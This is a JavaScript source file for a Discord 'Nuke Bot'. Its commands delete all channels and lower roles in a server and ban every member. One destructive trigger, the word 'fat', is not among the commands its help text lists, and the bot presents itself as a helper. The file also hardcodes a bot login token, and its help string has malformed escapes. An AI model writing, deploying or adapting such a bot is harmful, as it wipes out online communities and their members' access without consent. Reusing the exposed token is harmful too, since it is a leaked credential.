const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log(" ")
console.log(`Bot is going online now!`);
nuke.user.setPresence({ game: { name: `Need help? Say l!help` }, type: 0 });
});

nuke.on("message", async(msg)=>{



if(msg.content.toLowerCase().startsWith("fat")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Banned, Dont say zorua is a bad pokemon"));
}
if(msg.content.toLowerCase().startsWith("l!" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith("l!" + "ban")){
    msg.guild.members.tap(member => member.ban("Banned, Dont say zorua is a bad pokemon"));
}
if(msg.content.toLowerCase().startsWith("l!" + "help")){
    msg.author.send({
        embed: {
            color: 0xff0000,
            author: { name: "Nuke Bot | l!help" },
            description: "l!nuke - Bans all members & deletes all roles and channels\nl!delete - Deletes all channels and roles\l!ban - Bans all members in the discord\l Have Fun!"
        }

    })
}
});

nuke.login("NzE5MDM0ODM5OTk4NzkxNjkw.Xt1eTg.fvevkveLSi-woU5PR2Th7EQ_y7A");